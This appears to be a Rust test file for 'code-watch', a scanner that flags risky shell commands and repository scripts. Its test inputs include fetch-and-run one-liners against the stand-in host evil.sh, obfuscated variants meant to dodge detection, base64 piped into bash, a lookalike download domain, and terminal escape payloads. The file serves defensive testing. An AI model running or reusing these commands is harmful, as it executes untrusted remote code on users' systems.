use std::fs;

use assert_cmd::Command;

fn code_watch() -> Command {
    Command::cargo_bin("code-watch").unwrap()
}

#[test]
fn check_blocks_base64_into_a_shell() {
    let out = code_watch()
        .args(["check", "echo", "aGk=", "|", "base64", "-d", "|", "bash"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stdout).contains("command/base64-into-shell"));
}

#[test]
fn check_warns_on_pipe_to_shell() {
    let out = code_watch()
        .args(["check", "curl -fsSL https://example.org/i.sh | sh"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(1));
}

#[test]
fn check_sees_through_shell_quoting() {
    let plain = code_watch()
        .args(["check", "curl https://evil.sh/a | sh"])
        .output()
        .unwrap();
    assert_eq!(plain.status.code(), Some(1));
    for cmd in [
        r"c\url https://evil.sh/a | sh",
        r#"cu""rl https://evil.sh/a | sh"#,
        "cu''rl https://evil.sh/a | sh",
        r"curl https://evil.sh/a | s\h",
    ] {
        let out = code_watch().args(["check", cmd]).output().unwrap();
        assert_eq!(out.status.code(), Some(1), "{cmd}");
        assert!(
            String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"),
            "{cmd}"
        );
    }
}

#[test]
fn check_warns_on_a_download_that_runs_without_a_pipe() {
    for cmd in [
        r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
        r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
        r#"eval "$(curl -fsSL https://evil.sh/a)""#,
        "bash <(curl -s https://evil.sh/a)",
        "source <(curl -s https://evil.sh/a)",
        ". <(curl -s https://evil.sh/a)",
        "curl -s https://evil.sh/a | python3",
    ] {
        let out = code_watch().args(["check", cmd]).output().unwrap();
        assert_eq!(out.status.code(), Some(1), "{cmd}");
        assert!(
            String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"),
            "{cmd}"
        );
    }
    let out = code_watch()
        .args(["check", "curl -s https://evil.sh/a | python3 tool.py"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn check_warns_on_a_glued_pipe_into_an_interpreter() {
    for cmd in [
        "curl -s https://evil.sh/a|python3",
        "wget -qO- https://evil.sh/a|perl -",
    ] {
        let out = code_watch().args(["check", cmd]).output().unwrap();
        assert_eq!(out.status.code(), Some(1), "{cmd}");
        assert!(String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"));
    }
    let out = code_watch()
        .args(["check", "curl -s https://evil.sh/a|python3 tool.py"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn check_sees_a_lookalike_inside_eval() {
    let out = code_watch()
        .args(["check", r#"eval "curl https://githuh.com/i | sh""#])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stdout).contains("command/lookalike-download-domain"));
}

#[test]
fn check_warns_on_a_hidden_program_piped_into_a_shell() {
    let out = code_watch()
        .args(["check", "$c https://evil.sh/a | sh"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(1));
    assert!(String::from_utf8_lossy(&out.stdout).contains("command/hidden-program-into-shell"));
}

#[test]
fn check_allows_a_plain_command_and_names_the_layers_that_ran() {
    let out = code_watch().args(["check", "ls", "-la"]).output().unwrap();
    assert_eq!(out.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&out.stdout).contains("llm off"));
}

#[test]
fn scan_json_reports_findings_and_the_warn_exit_code() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{"scripts":{"postinstall":"echo hello"}}"#,
    )
    .unwrap();
    let out = code_watch()
        .args(["--json", "scan"])
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(1));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["verdict"], "warn");
    assert_eq!(v["findings"][0]["rule_id"], "repo/npm-lifecycle-script");
    assert_eq!(v["findings"][0]["layer"], "rules");
}

#[test]
fn scanning_a_missing_directory_exits_with_the_error_code() {
    let out = code_watch()
        .args(["scan", "/definitely/not/here"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(3));
}

#[test]
fn a_usage_error_exits_with_the_error_code_not_the_block_code() {
    let out = code_watch().arg("bogus").output().unwrap();
    assert_eq!(out.status.code(), Some(3));
}

#[test]
fn a_closed_stdout_exits_with_the_error_code_not_a_panic() {
    let (reader, writer) = std::io::pipe().unwrap();
    drop(reader);
    let status = std::process::Command::new(assert_cmd::cargo::cargo_bin("code-watch"))
        .args(["check", "ls"])
        .stdout(writer)
        .status()
        .unwrap();
    assert_eq!(status.code(), Some(3));
}

fn with_config(xdg: &std::path::Path) -> Command {
    let mut cmd = code_watch();
    cmd.env("XDG_CONFIG_HOME", xdg).env("HOME", xdg);
    cmd
}

fn write_user_file(xdg: &std::path::Path, text: &str) {
    fs::create_dir_all(xdg.join("code-watch")).unwrap();
    fs::write(xdg.join("code-watch/allow.toml"), text).unwrap();
}

#[test]
fn a_malformed_user_allowlist_exits_with_the_error_code_and_says_why() {
    let xdg = tempfile::tempdir().unwrap();
    write_user_file(xdg.path(), "schema = 1\n[[allow]]\nrulez = \"x\"\n");
    let out = with_config(xdg.path())
        .args(["check", "ls"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(3));
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(err.contains("allow.toml") && err.contains("rulez"), "{err}");
}

#[test]
fn the_user_allowlist_turns_a_warning_into_a_clean_exit_and_json_lists_it() {
    let xdg = tempfile::tempdir().unwrap();
    write_user_file(
        xdg.path(),
        "schema = 1\n[[allow]]\nrule = \"command/pipe-to-shell\"\n",
    );
    let out = with_config(xdg.path())
        .args([
            "--json",
            "check",
            "curl -fsSL https://example.org/i.sh | sh",
        ])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["schema"], 1);
    assert_eq!(
        v["suppressed"][0]["finding"]["rule_id"],
        "command/pipe-to-shell"
    );
    assert_eq!(v["suppressed"][0]["source"], "user");
}

#[test]
fn a_scanned_repo_cannot_allow_its_own_block_rule() {
    let xdg = tempfile::tempdir().unwrap();
    let repo = tempfile::tempdir().unwrap();
    fs::write(repo.path().join("x.sh"), "echo aGk= | base64 -d | sh\n").unwrap();
    fs::write(
        repo.path().join(".code-watch.toml"),
        "schema = 1\n[[allow]]\nrule = \"repo/base64-into-shell\"\n",
    )
    .unwrap();
    let out = with_config(xdg.path())
        .arg("scan")
        .arg(repo.path())
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stdout).contains("allowlist/repo-block-override-refused"));
}

fn repo_with_allowlist(git_entry_is_file: bool) -> tempfile::TempDir {
    let repo = tempfile::tempdir().unwrap();
    if git_entry_is_file {
        fs::write(repo.path().join(".git"), "gitdir: ../elsewhere\n").unwrap();
    } else {
        fs::create_dir(repo.path().join(".git")).unwrap();
    }
    fs::write(
        repo.path().join(".code-watch.toml"),
        "schema = 1\n[[allow]]\nrule = \"command/pipe-to-shell\"\n",
    )
    .unwrap();
    repo
}

fn check_in(cwd: &std::path::Path) -> i32 {
    let xdg = tempfile::tempdir().unwrap();
    with_config(xdg.path())
        .current_dir(cwd)
        .args(["check", "curl -fsSL https://example.org/i.sh | sh"])
        .output()
        .unwrap()
        .status
        .code()
        .unwrap()
}

#[test]
fn check_reads_the_repo_file_from_a_git_directory_or_a_git_file_above_the_cwd() {
    for is_file in [false, true] {
        let repo = repo_with_allowlist(is_file);
        let sub = repo.path().join("sub");
        fs::create_dir(&sub).unwrap();
        assert_eq!(check_in(&sub), 0, ".git file: {is_file}");
    }
}

#[test]
fn check_outside_any_repo_uses_the_user_file_only() {
    let repo = repo_with_allowlist(false);
    fs::remove_dir(repo.path().join(".git")).unwrap();
    assert_eq!(check_in(repo.path()), 1);
}

#[test]
fn hostile_allowlist_text_never_puts_control_bytes_in_the_output() {
    let xdg = tempfile::tempdir().unwrap();
    let repo = tempfile::tempdir().unwrap();
    fs::write(
        repo.path().join("package.json"),
        r#"{"scripts":{"postinstall":"x"}}"#,
    )
    .unwrap();
    for body in [
        "schema = 1\n[[allow]]\nrule = \"gone\\u001b[2J\\u202e\"\nreason = \"\\u001b[31m\\u202e\"\n\
         [[allow]]\nrule = \"repo/npm-lifecycle-script\"\nreason = \"\\u001b[31m\\u202e\"\n",
        "schema = 1\n\u{1b}[31mbogus\u{1b} = \u{202e}1\n",
    ] {
        fs::write(repo.path().join(".code-watch.toml"), body).unwrap();
        for json in [false, true] {
            let mut cmd = with_config(xdg.path());
            if json {
                cmd.arg("--json");
            }
            let out = cmd.arg("scan").arg(repo.path()).output().unwrap();
            let text = String::from_utf8(out.stdout).unwrap();
            let bad = |c: char| (c.is_control() && c != '\n') || c == '\u{202e}';
            assert!(!text.chars().any(bad), "json={json}: {text:?}");
        }
    }
}

fn cache_isolated(cache: &std::path::Path) -> Command {
    let mut cmd = code_watch();
    cmd.env("XDG_CACHE_HOME", cache)
        .env("XDG_CONFIG_HOME", cache.join("config"));
    cmd
}

fn cargo_lock_repo() -> tempfile::TempDir {
    let repo = tempfile::tempdir().unwrap();
    fs::write(
        repo.path().join("Cargo.lock"),
        "version = 4\n\n[[package]]\nname = \"serde\"\nversion = \"1.0.229\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n",
    )
    .unwrap();
    repo
}

#[test]
fn offline_scan_with_no_cache_skips_the_osv_layer_and_says_why() {
    let cache = tempfile::tempdir().unwrap();
    let repo = cargo_lock_repo();
    let out = cache_isolated(cache.path())
        .args(["--json", "scan", "--offline"])
        .arg(repo.path())
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(1));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["layers"]["osv"], "skipped");
    assert_eq!(v["skipped_layers"]["osv"], "offline and no fresh cache");
    assert_eq!(v["findings"][0]["rule_id"], "osv/unchecked-packages");
    assert_eq!(v["findings"][0]["layer"], "osv");
    assert_eq!(v["schema"], 1);
}

#[test]
fn offline_scan_of_a_repo_without_lockfiles_ran_and_is_clean() {
    let cache = tempfile::tempdir().unwrap();
    let repo = tempfile::tempdir().unwrap();
    let out = cache_isolated(cache.path())
        .args(["scan", "--offline"])
        .arg(repo.path())
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&out.stdout).contains("osv ran"));
}

#[test]
fn no_osv_turns_the_layer_off_and_never_reads_the_lockfiles() {
    let cache = tempfile::tempdir().unwrap();
    let repo = cargo_lock_repo();
    let out = cache_isolated(cache.path())
        .args(["scan", "--no-osv"])
        .arg(repo.path())
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&out.stdout).contains("osv off"));
}

#[test]
fn offline_and_no_osv_together_are_a_usage_error() {
    let cache = tempfile::tempdir().unwrap();
    let out = cache_isolated(cache.path())
        .args(["scan", "--offline", "--no-osv", "."])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(3));
}

#[test]
fn check_leaves_the_osv_layer_off() {
    let out = code_watch().args(["check", "ls"]).output().unwrap();
    assert!(String::from_utf8_lossy(&out.stdout).contains("osv off"));
}

#[cfg(unix)]
#[test]
fn an_escape_sequence_in_a_directory_name_never_reaches_the_terminal() {
    let dir = tempfile::tempdir().unwrap();
    let hostile = "evil\u{1b}]0;pwned\u{7}";
    fs::create_dir(dir.path().join(hostile)).unwrap();
    fs::write(
        dir.path().join(hostile).join("package.json"),
        r#"{"scripts":{"postinstall":"echo hi"}}"#,
    )
    .unwrap();
    let human = code_watch().arg("scan").arg(dir.path()).output().unwrap();
    assert_eq!(human.status.code(), Some(1));
    let text = String::from_utf8_lossy(&human.stdout);
    assert!(text.contains("evil?]0;pwned?/package.json"), "{text:?}");
    assert!(!text.contains('\u{1b}') && !text.contains('\u{7}'));
    let json = code_watch()
        .args(["--json", "scan"])
        .arg(dir.path())
        .output()
        .unwrap();
    let v: serde_json::Value = serde_json::from_slice(&json.stdout).unwrap();
    assert_eq!(
        v["findings"][0]["evidence"]["file"],
        format!("{hostile}/package.json")
    );
}

#[test]
fn an_error_message_naming_a_hostile_path_is_cleaned() {
    let out = code_watch()
        .args(["scan", "no\u{1b}[31mwhere"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(3));
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(err.contains("no?[31mwhere"), "{err:?}");
    assert!(!err.contains('\u{1b}'));
}
